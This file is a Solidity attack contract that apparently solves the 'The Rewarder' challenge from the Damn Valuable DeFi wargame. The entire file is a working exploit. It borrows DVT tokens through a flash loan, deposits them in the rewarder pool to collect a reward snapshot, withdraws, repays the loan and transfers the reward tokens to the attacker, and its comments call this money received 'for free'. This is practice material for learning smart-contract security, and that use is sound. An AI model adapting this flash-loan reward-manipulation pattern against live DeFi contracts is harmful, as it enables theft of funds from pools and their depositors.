// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "solady/src/utils/SafeTransferLib.sol";

contract AttackRewarder {
    address payable public immutable attacker;
    TheRewarderPool public immutable rewarderPool;
    FlashLoanerPool public immutable loanPool;
    DamnValuableToken public immutable dvtToken;
    RewardToken public immutable rewardsToken;

    constructor(
        TheRewarderPool _rewarderPool,
        FlashLoanerPool _loanPool,
        DamnValuableToken _dvtToken,
        RewardToken _rewardsToken
    ) {
        attacker = payable(msg.sender);
        rewarderPool = _rewarderPool;
        loanPool = _loanPool;
        dvtToken = _dvtToken;
        rewardsToken = _rewardsToken;
    }

    function attack(uint256 amount) external {
        // triggers flash loan
        loanPool.flashLoan(amount);

        // Transfer remaining rewards back to attacker.
        uint256 remainingRewards = rewardsToken.balanceOf(address(this));
        SafeTransferLib.safeTransfer(
            address(rewardsToken),
            attacker,
            remainingRewards
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        // receives DVT flash loan and with that amount, depositis inside pool
        // We need to approve rewarder pool first.
        dvtToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);

        // After getting our rewards distributed, we burn getting back the amount of DVT tokens to pay the loan.
        // Here we will get extra rewards token for later. We've just received money for free.
        rewardsToken.approve(address(rewarderPool), amount);
        rewarderPool.withdraw(amount);

        // We pay back the initial loan
        SafeTransferLib.safeTransfer(
            address(dvtToken),
            address(loanPool),
            amount
        );
    }
}
